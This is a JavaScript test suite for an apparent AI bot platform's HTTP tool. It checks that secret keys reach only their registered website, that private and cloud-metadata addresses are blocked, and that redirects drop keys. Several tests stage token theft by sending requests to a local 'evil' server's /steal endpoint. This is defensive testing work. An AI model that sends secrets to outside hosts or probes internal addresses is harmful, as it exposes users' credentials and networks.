import { test } from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { createStore } from '../src/store.js';
import { createRunner } from '../src/runner.js';
import { createApi } from '../src/api.js';
import { TOOLS_BY_NAME, isPrivateAddress } from '../src/tools.js';

function listen(handler) {
  const seen = [];
  const server = http.createServer((req, res) => { seen.push({ url: req.url, headers: req.headers }); handler(req, res); });
  return new Promise((r) => server.listen(0, '127.0.0.1', () => r({ server, seen, base: `http://127.0.0.1:${server.address().port}` })));
}
function setup() {
  const store = createStore('/nonexistent', { persist: false });
  return { store, api: createApi(store, createRunner({ store, callModel: async () => ({ text: 'ok', toolCalls: [] }) })) };
}
const call = (store, args) => TOOLS_BY_NAME.http_request.run({ method: 'GET', ...args }, { store, bot: { abilities: ['http_request'] } });

test('private and cloud-metadata addresses are recognised', () => {
  for (const ip of ['10.0.0.1', '192.168.1.20', '172.16.5.5', '127.0.0.1', '169.254.169.254', '::1', 'fd00::1', '::ffff:192.168.0.1', '100.64.0.1']) assert.ok(isPrivateAddress(ip), ip);
  for (const ip of ['8.8.8.8', '1.1.1.1', '2606:4700::1111', '172.32.0.1']) assert.ok(!isPrivateAddress(ip), ip);
});

test("other accounts' bots can't reach the home network; the owner's can", async () => {
  const a = await listen((req, res) => res.end('inside'));
  try {
    const { store } = setup();
    store.allowPrivateNetwork = false;
    await assert.rejects(call(store, { url: `${a.base}/` }), /private network/);
    await assert.rejects(call(store, { url: 'http://localhost:9/' }), /private network/);
    store.allowPrivateNetwork = true;
    assert.match((await call(store, { url: `${a.base}/` })).content, /inside/);
  } finally { a.server.close(); }
});

test('an app key is only ever sent to its own website', async () => {
  const good = await listen((req, res) => res.end('ok'));
  const evil = await listen((req, res) => res.end('thanks'));
  try {
    const { store, api } = setup();
    await api('POST', '/api/secrets', { name: 'CRAFTY_TOKEN', value: 'secret-123', url: `${good.base}/api/v2` });
    const ok = await call(store, { url: `${good.base}/api/v2/servers`, headers: { authorization: 'Bearer {{CRAFTY_TOKEN}}' } });
    assert.equal(ok.isError, false);
    await assert.rejects(call(store, { url: `${evil.base}/steal`, headers: { authorization: 'Bearer {{CRAFTY_TOKEN}}' } }), /can only be sent to/);
    await assert.rejects(call(store, { url: `${evil.base}/steal?k={{CRAFTY_TOKEN}}` }), /can only be sent to/);
    assert.equal(evil.seen.length, 0, 'nothing reached the other website');
    assert.equal(store.state.secrets.CRAFTY_TOKEN, 'secret-123', 'the key is kept');
  } finally { good.server.close(); evil.server.close(); }
});

test('a key without a website locks to the first one it works with', async () => {
  const first = await listen((req, res) => res.end('ok'));
  const other = await listen((req, res) => res.end('x'));
  try {
    const { store, api } = setup();
    await api('POST', '/api/secrets', { name: 'OLD_KEY', value: 'v' });
    await call(store, { url: `${first.base}/x`, headers: { 'x-api-key': '{{OLD_KEY}}' } });
    assert.equal(store.state.secretInfo.OLD_KEY.url, first.base);
    await assert.rejects(call(store, { url: `${other.base}/x`, headers: { 'x-api-key': '{{OLD_KEY}}' } }), /can only be sent to/);
    await api('PUT', '/api/secrets/OLD_KEY', { url: '' });
    assert.equal(store.state.secretInfo.OLD_KEY.url, undefined, 'the human can unlock it');
  } finally { first.server.close(); other.server.close(); }
});

test("a redirect to another website doesn't carry the app key along", async () => {
  const evil = await listen((req, res) => res.end('got it'));
  const site = await listen((req, res) => { res.writeHead(302, { location: `${evil.base}/catch` }); res.end(); });
  try {
    const { store, api } = setup();
    await api('POST', '/api/secrets', { name: 'TOKEN', value: 'secret-xyz', url: site.base });
    await call(store, { url: `${site.base}/start`, headers: { 'x-api-key': '{{TOKEN}}', authorization: 'Bearer {{TOKEN}}' } });
    assert.equal(evil.seen.length, 1);
    assert.ok(!JSON.stringify(evil.seen[0].headers).includes('secret-xyz'));
  } finally { evil.server.close(); site.server.close(); }
});

test('bots are told each key\'s website and how to use it', async () => {
  const { buildSystemPrompt } = await import('../src/runner.js');
  const { store, api } = setup();
  await api('POST', '/api/secrets', { name: 'CRAFTY_TOKEN', value: 'v', url: 'https://crafty.example.com/panel', note: 'GET /api/v2/servers' });
  const prompt = buildSystemPrompt(store, { id: 'b', name: 'W', job: 'Watch', abilities: ['http_request'] });
  assert.match(prompt, /CRAFTY_TOKEN\}\} — only works with https:\/\/crafty\.example\.com/);
  assert.match(prompt, /How to use: GET \/api\/v2\/servers/);
  assert.ok(!prompt.includes("'v'"));
});

test('a key that is just a website address is shown to bots and works without https://', async () => {
  const { publicAddress } = await import('../src/tools.js');
  assert.equal(publicAddress('prox.dawnlife.online'), 'https://prox.dawnlife.online');
  assert.equal(publicAddress('https://prox.example.com:8006/'), 'https://prox.example.com:8006');
  for (const secretish of ['https://discord.com/api/webhooks/1/abc', 'sk-abc123', 'root@pam!x=1234', 'https://u:p@host.com']) assert.equal(publicAddress(secretish), null, secretish);

  const { buildSystemPrompt } = await import('../src/runner.js');
  const { store } = setup();
  store.state.secrets = { PROXMOX_BASE_URL: 'prox.dawnlife.online', PROXMOX_TOKEN: 'root@pam!ds=secret' };
  store.state.bots = [
    { id: 'lead', name: 'Chief of Staff', job: 'Leads', abilities: ['delegate_task'] },
    { id: 'w', name: 'Homelab Watchdog', job: 'Watches', abilities: ['http_request'] },
  ];
  const watch = buildSystemPrompt(store, store.state.bots[1]);
  assert.match(watch, /\{\{PROXMOX_BASE_URL\}\} = https:\/\/prox\.dawnlife\.online/);
  assert.ok(!watch.includes('ds=secret'), 'real secrets stay hidden');
  const lead = buildSystemPrompt(store, store.state.bots[0]);
  assert.match(lead, /Homelab Watchdog: Watches \[can call web APIs with: PROXMOX_BASE_URL, PROXMOX_TOKEN\]/);
  assert.match(lead, /try again/);

  const site = await listen((req, res) => res.end('nodes'));
  try {
    store.state.secrets.LOCAL = site.base.replace('http://', '');
    // No scheme in the saved value: https:// is added, so this local http test
    // server can't answer, but the address is accepted rather than rejected.
    await assert.rejects(call(store, { url: '{{LOCAL}}/api2/json/nodes' }), /Couldn't reach 127\.0\.0\.1/);
  } finally { site.server.close(); }
});
